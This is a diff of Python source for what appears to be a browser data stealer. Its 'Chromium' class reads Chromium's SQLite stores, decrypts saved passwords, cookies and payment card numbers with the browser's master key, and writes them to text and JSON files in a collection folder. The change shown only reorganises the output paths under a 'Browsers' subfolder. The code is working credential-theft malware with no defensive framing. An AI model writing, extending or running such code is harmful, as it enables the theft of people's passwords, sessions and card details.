@@ -2,7 +2,7 @@ from sqlite3 import connect
 from shutil import copyfile
 from base64 import b64decode
 from json import loads, dump
-from os import path, mkdir, remove
+from os import path, makedirs, remove
 from datetime import datetime, timedelta
 
 from Crypto.Cipher import AES
@@ -25,7 +25,7 @@ class Chromium:
         paths = [path.exists(item) for item in [self.passwords_path, self.cookies_path, self.alt_cookies_path, self.cards_path]]
 
         if any(paths) and any(self.statuses):
-            mkdir(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}")
+            makedirs(rf"{self.storage_path}\{self.storage_folder}\Browsers\{self.browser_name}")
 
     def __get_key(self):
 
@@ -41,7 +41,7 @@ class Chromium:
 
     def __write_passwords(self, cursor, master_key):
 
-        with open(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}\Passwords.txt", "a", encoding="utf-8") as passwords:
+        with open(rf"{self.storage_path}\{self.storage_folder}\Browsers\{self.browser_name}\Passwords.txt", "a", encoding="utf-8") as passwords:
             for result in cursor.execute(self.config.PasswordsSQL).fetchall():
 
                 password = self.__decrypt(result[2], master_key)
@@ -77,7 +77,7 @@ class Chromium:
                 "is_same_party": result[17],
             })
 
-        with open(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}\Cookies.json", "a", encoding="utf-8") as cookies:
+        with open(rf"{self.storage_path}\{self.storage_folder}\Browsers\{self.browser_name}\Cookies.json", "a", encoding="utf-8") as cookies:
 
             dump(results, cookies)
 
@@ -85,7 +85,7 @@ class Chromium:
 
     def __write_cards(self, cursor, master_key):
 
-        with open(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}\Cards.txt", "a", encoding="utf-8") as cards:
+        with open(rf"{self.storage_path}\{self.storage_folder}\Browsers\{self.browser_name}\Cards.txt", "a", encoding="utf-8") as cards:
             for result in cursor.execute(self.config.CardsSQL).fetchall():
 
                 number = self.__decrypt(result[3], master_key)
